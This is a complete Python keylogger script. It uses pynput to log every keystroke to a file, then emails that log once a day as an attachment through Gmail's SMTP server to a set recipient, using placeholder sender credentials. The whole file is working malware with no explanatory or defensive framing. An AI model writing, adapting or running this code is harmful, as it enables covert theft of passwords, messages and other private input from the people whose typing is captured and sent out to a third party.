from pynput.keyboard import Key, Listener 
import logging
import smtplib
import time
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders, message

last_update = ''
todays_date = str(datetime.datetime.now().strftime('%x'))
log_dir = ''

def send_email(): 
    s_email = 'senders_email@example.com'
    s_pwd = 'sender_password'
    r_email = 'recipient_email@example.com'
    port = '587'
    smpt_server = 'smtp.gmail.com'
        
    message = MIMEMultipart()
    message['From'] = s_email
    message['To'] = r_email
    message['Subject'] = 'Keystroke logs ' + str(todays_date)
    file = 'logs.txt'
    attachment = open(file, 'rb')

    obj = MIMEBase('application','octet-stream')
    obj.set_payload((attachment).read())
    encoders.encode_base64(obj)
    obj.add_header('Content-Disposition', 'attachment; filename= '+file)

    message.attach(obj)
    msg = message.as_string()

    email_session = smtplib.SMTP('smtp.gmail.com', 587)
    email_session.starttls()
    email_session.login(s_email,s_pwd)

    email_session.sendmail(s_email,r_email,msg)

    email_session.quit()
        
logging.basicConfig(filename=(log_dir + 'logs.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%M/%D/%Y %I:%M:%S %p')

def on_press(key): logging.info(str(key))

def on_release(key):
    global last_update

    if(last_update != todays_date):
        last_update = todays_date
        send_email()
            
with Listener(on_press=on_press, on_release=on_release) as listener: listener.join()
    












